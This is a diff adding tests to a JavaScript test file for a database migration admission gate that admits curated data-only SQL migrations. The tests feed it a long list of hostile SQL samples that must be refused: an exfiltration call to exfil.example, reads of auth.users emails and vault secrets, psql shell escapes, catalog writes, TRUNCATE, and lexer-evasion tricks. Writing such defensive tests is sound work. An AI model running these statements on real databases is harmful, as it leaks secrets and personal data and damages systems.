@@ -3,7 +3,7 @@ import { currentRepository, expectedOperatorAssociation } from '../lib/repositor
 // Fixtures follow the resolved repository identity and its operator association (#3255).
 const THIS_REPO = currentRepository(), OPERATOR_ASSOCIATION = expectedOperatorAssociation()
 import assert from 'node:assert/strict'
-import { evaluateAdmission, parseImpactBlock, STRUCTURAL_CHANGE_TYPES, NON_STRUCTURAL_CHANGE_TYPES, assertPrCarriesStructuralChange, inspectPrStructuralChange } from './admission.mjs'
+import { evaluateAdmission, parseImpactBlock, STRUCTURAL_CHANGE_TYPES, NON_STRUCTURAL_CHANGE_TYPES, assertPrCarriesStructuralChange, inspectPrStructuralChange, inspectPrCuratedDataChange } from './admission.mjs'
 import { OutcomeError, advanceOutcome, completeOutcome, outcomeEvent, outcomeHistory, repairOutcomeHistory, trustedOutcomeComments, OUTCOME_STATES, parseOutcomeEvidence } from './outcome-lifecycle.mjs'
 import { coordinationEvent, formatEventComment, parseEventComment } from '../db-coordination-events.mjs'
 import { admitIssue, buildDynamicQueues, claimBody, derivePrOperationRoute, EXCLUSIVE_REFS, main as managerMain, matchesGeneratedTypesProof, matchesLiveProof, MUTEX_REF, parseQueueScope, resolveAdmittedIssueForPr } from '../manage-migration-author-lanes.mjs'
@@ -1057,4 +1057,198 @@ test('structural admission accounts for exact roles and ownership dependencies',
   assert.deepEqual(actual.reads,['role "Worker"'])
   assert.deepEqual(inspectPrStructuralChange(file("DO $$ BEGIN EXECUTE 'CREATE ROLE worker'; END $$;")).objects,['role worker'])
   assert.throws(() => inspectPrStructuralChange(file("DO $$ BEGIN EXECUTE format('CREATE ROLE %I', name); END $$;")), /dynamic role/)
+})
+
+// Issue #4172 / PR #4176: a curated Master Data fork that ships a data-only
+// migration must claim a lane (section-4 anti-collision rules), so admission
+// must accept it. Before the fix every filing was refused: structural/claim-first
+// as "no statement-leading schema DDL", curated as "misrouted".
+const curatedBody = ({ change='migration', extra=[] } = {}) => ['```db-work-scope','status: ready','work_type: curated-master-data','route: curated-master-data-governance',
+  `change_type: ${change}`,'live_assertion: production core.property has exactly one active row','generated_types: not-applicable','priority: 800','depends_on:','writes:','reads:',...extra,'```'].join('\n')
+const curatedSql = "insert into core.property (name, licensor_id) select 'Exorcist, The (1973)', l.id from core.licensor l where l.name = 'WARNER BROS' on conflict do nothing;\n"
+const curatedIo = (body, sql) => ({
+  getIssue:()=>issue(body,4172),getPr:()=>({state:'open',head:{sha:'f'.repeat(40)},merged_at:null}),
+  closingIssuesForPr:()=>[{number:4172,state:'open'}],
+  getPrFiles:()=>[{filename:'supabase/migrations/20261011164757_curated_warner_property_the_exorcist_1973.sql',status:'added'}],
+  getFileAt:()=>sql,
+})
+
+test('curated master data fork with a data-only migration is admitted for its pull request (#4172)', () => {
+  const body = curatedBody()
+  const admitted = evaluateAdmission(issue(body,4172), parseQueueScope(body), null)
+  assert.equal(admitted.admitted, true); assert.equal(admitted.curated, true); assert.deepEqual(admitted.writes, [])
+  const withPr = admitIssue(4172, curatedIo(body, curatedSql), { pr: 4176, allowLegacy: true })
+  assert.equal(withPr.admitted, true)
+  assert.deepEqual(withPr.actual_objects, [])
+  assert.deepEqual(withPr.migrations, ['supabase/migrations/20261011164757_curated_warner_property_the_exorcist_1973.sql'])
+  assert.equal(derivePrOperationRoute(4176, curatedIo(body, curatedSql)).route, 'structural')
+})
+
+test('curated master data admission still refuses schema DDL, non-migration change types, and missing migrations', () => {
+  const body = curatedBody()
+  assert.throws(() => admitIssue(4172, curatedIo(body, curatedSql + 'alter table core.property add column x int;\n'), { pr: 4176, allowLegacy: true }), /changes database structure.*require work_type structural/)
+  const io = { ...curatedIo(body, curatedSql), getPrFiles:()=>[{filename:'docs/x.md',status:'added'}] }
+  assert.throws(() => admitIssue(4172, io, { pr: 4176, allowLegacy: true }), /contains no added or modified migration/)
+  const table = curatedBody({ change:'table' })
+  assert.throws(() => evaluateAdmission(issue(table,4172), parseQueueScope(table), null), /change_type table is not admissible/)
+  assert.throws(() => parseQueueScope(curatedBody({ extra:['  - table core.property'] })), /must not claim database objects/)
+})
+
+test('structural route still refuses a data-only migration (gate unchanged)', () => {
+  assert.throws(() => inspectPrStructuralChange([{filename:'supabase/migrations/20261011164757_x.sql',status:'added',content:curatedSql}]), /no statement-leading schema DDL/)
+})
+
+test('curated data-only inspection fails closed on SQL its detectors cannot see (#4185 review)', () => {
+  const file = (content) => [{ filename:'supabase/migrations/20261011164757_x.sql', status:'added', content }]
+  const ins = "insert into core.property (name) values ('a');\n"
+  const guarded = [
+    "do $g$ declare v int; v_id uuid; begin",
+    "  -- a comment with 'quotes' and -- dashes /* not a block */",
+    "  insert into core.property (name, notes) values ('a -- b''c', E'it\\'s', $q$Bob's -- notes$q$) on conflict (name) do nothing returning id into v_id;",
+    "  insert into plm.licensing_write_authorization (backend_pid) values (pg_backend_pid());",
+    "  update core.property set status = 'active' where name = 'a' returning id into strict v_id;",
+    "  select count(*) into v from core.property where name = 'a' for update;",
+    "  if v is null then raise exception 'x'; end if;",
+    "end $g$;",
+  ].join('\n')
+  // The nested dollar quote above is inside a DO block and is refused; the
+  // admitted fixture keeps dollar literals at top level only.
+  const admitted = guarded.replace("$q$Bob's -- notes$q$", "'Bob''s -- notes'")
+  assert.deepEqual(inspectPrCuratedDataChange(file(admitted)).row_writes, ['table core.property', 'table plm.licensing_write_authorization'])
+  assert.deepEqual(inspectPrCuratedDataChange(file("insert into core.property (notes) values ($q$Bob's -- notes$q$);\n")).row_writes, ['table core.property'])
+  assert.deepEqual(inspectPrCuratedDataChange(file("update core.property set status = 'active' where id = 5 and licensor_id = -2 returning id;\ndelete from core.taxonomy_source_ref where entity_id = 'e1';\ninsert into core.property (name) select l.name from core.licensor l, plm.wb_property w where l.id = 1;\n")).row_writes, ['table core.property', 'table core.taxonomy_source_ref'])
+  const refused = [
+    // round 1: dynamic DDL, destructive and maintenance statements, vacuous loads
+    ["do $$ begin execute 'create table core.evil(id int)'; end $$;" + ins, /EXECUTE/],
+    ["do $$ begin execute format('create table %I.%I (id int)', 'core', 'evil'); end $$;" + ins, /EXECUTE/],
+    ['truncate core.property;' + ins, /TRUNCATE/],
+    ['reindex table core.property;' + ins, /structure|REINDEX/],
+    ['refresh materialized view core.x;' + ins, /REFRESH/],
+    ['set role postgres;' + ins, /SET LOCAL|ROLE/],
+    ['delete from core.property;', /no top-level WHERE clause that is a conjunction/],
+    ["update core.property set name = 'x';", /no top-level WHERE clause that is a conjunction/],
+    ['select 1;', /writes no row/],
+    // round 2: lexer desynchronisation
+    ["insert into core.property (name) values (E'a\\''); create table core.evil(id int); select 1; --'", /structure|CREATE/],
+    ["insert into core.property (notes) values ($q$Bob's notes$q$);\ndo $$ begin execute 'create table core.evil(id int)'; end $$;", /EXECUTE/],
+    ["do $$ begin exec/**/ute 'create table core.evil(id int)'; end $$;" + ins, /forbidden|EXEC/i],
+    ["insert into core.property (notes) values ($q$a -- b$q$); truncate core.property;", /TRUNCATE/],
+    // round 2: psql meta-commands, SELECT INTO, catalog writes, session settings, MERGE, misc
+    [ins + "select 'create table core.evil()' \\gexec\n", /backslash/],
+    [ins + '\\! touch /tmp/x\n', /backslash/],
+    [ins + "select 'x' as name into core.evil from core.licensor;", /SELECT \.\.\. INTO|INTO/],
+    ["update pg_catalog.pg_class set relhasoids = true where relname = 'property';", /PG_CATALOG|pg_/i],
+    ["insert into pg_catalog.pg_description values (1,2,3,'x');", /PG_CATALOG|pg_/i],
+    ['set session_replication_role = replica;' + ins, /SET LOCAL|SESSION_REPLICATION_ROLE/],
+    ["update other.thing set x = 1 where id = 1;", /outside curated Master Data/],
+    ['merge into core.property p using core.licensor l on true when matched then update set name = l.name;', /MERGE/],
+    ["prepare transaction 'x';" + ins, /PREPARE/],
+    ['reassign owned by a to b;' + ins, /REASSIGN/],
+    ['listen x;' + ins, /LISTEN/],
+    ['discard all;' + ins, /DISCARD/],
+    ['set search_path = core;' + ins, /SET LOCAL|SEARCH_PATH/],
+    [ins + 'select pg_terminate_backend(1);', /pg_terminate_backend/],
+    [ins + "select pg_file_write('x','y',false);", /pg_file_write/],
+    [ins + "select setval('core.s', 1);", /SETVAL/],
+    [ins + "select query_to_xml('create table x()', true, true, '');", /query_to_xml/],
+    [ins + "select dblink_exec('create table x()');", /dblink_exec/],
+    ['do language plpython3u $$ x $$;' + ins, /plpgsql/],
+    ["do $$ begin insert into core.property (name) values ('a'); update core.property set name = 'b'; end $$;", /no top-level WHERE clause that is a conjunction/],
+    ["do $$ begin select 1 into core.evil; end $$;" + ins, /unqualified PL\/pgSQL variable/],
+    // round 3: quoted identifiers, tautological bounds, sequences, quoted cron
+    [ins + 'select "pg_terminate_backend"(1);', /quoted identifier/],
+    [ins + 'select "pg_catalog"."set_config"(\'search_path\', \'x\', false);', /quoted identifier/],
+    [ins + 'select "dblink_exec"(\'create table x()\');', /quoted identifier/],
+    ['update "pg_catalog"."pg_class" set relhasoids = true where relname = \'p\';', /quoted identifier|outside curated|structure/],
+    ['delete from core.property where true;', /no top-level WHERE clause that is a conjunction/],
+    ["update core.property set name = 'x' where 1=1;", /no top-level WHERE clause that is a conjunction/],
+    ["update core.property set name = 'x' where id = id;", /no top-level WHERE clause that is a conjunction/],
+    [ins + "select nextval('core.s');", /nextval/],
+    // round 4: boolean/subquery-blind bounds, large objects, quoted case
+    ['delete from core.property where id = 1 or true;', /conjunction/],
+    ["update core.property set name = 'x' where id = 1 or 1=1;", /conjunction/],
+    ['delete from core.property where not (id = 1);', /conjunction/],
+    ['delete from core.property where exists (select 1 from core.licensor where id = 1);', /conjunction/],
+    ['delete from core.property where id in (select id from core.licensor where id = 1);', /conjunction/],
+    ['update core.property set name = l.name from core.licensor l where l.id = 1;', /FROM\/USING/],
+    [ins + 'select lo_create(0);', /lo_create/],
+    [ins + "select lo_write(1, 'x');", /lo_write/],
+    ['insert into "CORE"."PROPERTY" (name) values (\'a\');', /outside curated Master Data/],
+    // round 5: expression calls are allowlisted, reads are confined, cron names forbidden
+    [ins + "select net.http_post('https://exfil.example/x', (select count(*) from core.property));", /net\.http_post is not an allowed/],
+    [ins + "select vault.create_secret('k', 'v');", /vault\.create_secret is not an allowed/],
+    [ins + 'select public.refresh_style_guide_library_default_snapshot();', /is not an allowed/],
+    [ins + "select http_get('https://x');", /http_get is not an allowed/],
+    [ins + 'select "anything"(1);', /is not an allowed/],
+    ['insert into core.property (name) select email from auth.users;', /read source auth\.users is outside/],
+    ['insert into core.property (name) select decrypted_secret from vault.decrypted_secrets;', /read source vault\.decrypted_secrets is outside/],
+    ["insert into core.property (name) select name from core.licensor l join public.profiles p on p.id = l.id;", /read source public\.profiles is outside/],
+    [ins + "select cron_schedule('j', '* * * * *', 'select 1');", /CRON_SCHEDULE/],
+    // round 6: comma-separated read sources, column = column bounds
+    ['insert into core.property (name) select u.email from core.licensor l, auth.users u where l.id = 1;', /read source auth\.users is outside/],
+    ['insert into core.property (name) select s.secret from core.licensor l, vault.decrypted_secrets s;', /read source vault\.decrypted_secrets is outside/],
+    ['insert into core.property (name) select (select u.email from core.licensor l, auth.users u limit 1);', /read source auth\.users is outside/],
+    ['delete from core.property where a = b;', /conjunction/],
+    ["update core.property set name = 'x' where id = 1 and a = b;", /conjunction/],
+    [ins + "select extensions.set_config('search_path', 'x', false);", /SET_CONFIG/],
+    [ins + 'select "cron"."schedule"(\'j\', \'* * * * *\', \'select 1\');', /quoted identifier/],
+  ]
+  for (const [sql, pattern] of refused) {
+    let error = null
+    try { inspectPrCuratedDataChange(file(sql)) } catch (caught) { error = caught }
+    assert.ok(error, `admitted: ${sql}`)
+    assert.match(error.message, pattern, sql)
+    assert.ok(error.result?.evidence_required?.length, `no durable refusal result: ${sql}`)
+  }
+})
+
+test('curated refusals at PR admission carry a durable refusal result', () => {
+  const body = curatedBody()
+  let error
+  try { admitIssue(4172, curatedIo(body, 'truncate core.property;\n'), { pr: 4176, allowLegacy: true }) } catch (caught) { error = caught }
+  assert.match(error.message, /TRUNCATE/)
+  assert.ok(error.result && Array.isArray(error.result.evidence_required))
+  assert.doesNotMatch(error.result.evidence_required.join(' '), /statement-leading schema DDL/)
+  const missing = curatedBody({ extra:[] }).replace('generated_types: not-applicable\n','')
+  let missingError
+  try { evaluateAdmission(issue(missing,4172), parseQueueScope(missing), null) } catch (caught) { missingError = caught }
+  assert.match(missingError.message, /generated_types/); assert.ok(missingError.result)
+})
+
+// Issue #4190 / PR #4192: a migration that only changes pg_cron schedules was
+// refused as "no statement-leading schema DDL". pg_cron calls write cron.job
+// rows and are modelled as the exact structural object `table cron.job`.
+test('pg_cron schedule changes are structural writes on table cron.job (#4192)', () => {
+  const file = (content) => [{ filename:'supabase/migrations/20261011175808_x.sql', status:'added', content }]
+  const cron = "do $cadence$\ndeclare v_job_id bigint;\nbegin\n  select jobid into v_job_id from cron.job where jobname = 'refresh-style-guide-matviews';\n  if v_job_id is not null then perform cron.alter_job(job_id := v_job_id, schedule := '7 * * * *'); end if;\nend\n$cadence$;\n"
+  assert.deepEqual(inspectPrStructuralChange(file(cron)).objects, ['table cron.job'])
+  assert.deepEqual(inspectPrStructuralChange(file("select cron.schedule('j', '* * * * *', 'select 1');")).objects, ['table cron.job'])
+  assert.deepEqual(inspectPrStructuralChange(file("select cron.unschedule('j');")).objects, ['table cron.job'])
+  assert.deepEqual(inspectPrStructuralChange(file('select "cron"."schedule"(\'j\', \'* * * * *\', \'select 1\');')).objects, ['table cron.job'])
+  // prose or literals mentioning cron calls are not writes
+  assert.throws(() => inspectPrStructuralChange(file("-- perform cron.alter_job(1)\nselect 'cron.schedule(x)';")), /no statement-leading schema DDL/)
+  // the curated data-only path never admits a cron change
+  assert.throws(() => inspectPrCuratedDataChange(file("insert into core.property (name) values ('a');\nselect cron.schedule('j', '* * * * *', 'select 1');")), /CRON/)
+})
+
+// #4184: one active lease whose work issue has more than 100 comments made the
+// batched review-state snapshot refuse every reviewer draw in the repository.
+test('review-state evidence over 100 comments is completed by cursor, fail-closed', async () => {
+  const { completeReviewStatePages, reviewStateEntry } = await import('../lib/lanes/github-wire.mjs')
+  const node = (n) => ({ body: `c${n}`, authorAssociation: 'MEMBER' })
+  const fresh = () => ({
+    pr: { state:'OPEN', merged:false, headRefOid:'a'.repeat(40), comments:{ pageInfo:{ hasNextPage:false, endCursor:null }, nodes:[] }, reviews:{ pageInfo:{ hasNextPage:false, endCursor:null }, nodes:[] } },
+    issue: { state:'OPEN', comments:{ pageInfo:{ hasNextPage:true, endCursor:'c100' }, nodes:Array.from({ length:100 }, (_, n) => node(n)) } },
+  })
+  let row = fresh()
+  assert.throws(() => reviewStateEntry(row.pr, row.issue), /incomplete or paginated/)
+  const queries = []
+  const fetchPage = (query) => { queries.push(query); return { data:{ repository:{ x:{ comments:{ pageInfo:{ hasNextPage:false, endCursor:'c103' }, nodes:[node(100), node(101), node(102)] } } } } } }
+  const done = completeReviewStatePages(row.pr, row.issue, { issue:3536, pr:4171 }, fetchPage)
+  assert.equal(reviewStateEntry(done.pr, done.issue).evidence.length, 103)
+  assert.match(queries[0], /issue\(number:3536\)\{comments\(first:100,after:"c100"\)/)
+  row = fresh()
+  assert.throws(() => completeReviewStatePages(row.pr, row.issue, { issue:3536, pr:4171 }, () => ({ data:{ repository:{ x:{ comments:{ pageInfo:{ hasNextPage:true, endCursor:'c100' }, nodes:[] } } } } })), /incomplete or paginated/)
+  row = fresh()
+  assert.throws(() => completeReviewStatePages(row.pr, row.issue, { issue:3536, pr:4171 }, () => ({ errors:[{ message:'x' }] })), /incomplete or paginated/)
 })
